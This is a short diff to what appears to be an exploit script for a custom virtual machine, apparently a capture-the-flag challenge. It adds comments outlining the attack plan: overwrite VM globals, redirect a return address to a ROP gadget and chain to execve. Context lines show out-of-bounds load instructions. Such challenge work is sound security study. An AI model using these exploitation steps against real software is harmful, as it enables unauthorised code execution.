@@ -18,6 +18,14 @@
 #    { "ret",     17,    0 },
 #    { "halt",    18,    0 }
 
+## Explanation
+## overwriting vm->globals with vm->code
+## overwriting return address with rop gadget
+## overwriting next return address with execve
+## restoring vm->globals value from virtual machines
+## stack
+
+
 # storing address of vm->globals 
 # before overwriting it
 load -993		# first 4 byte of address
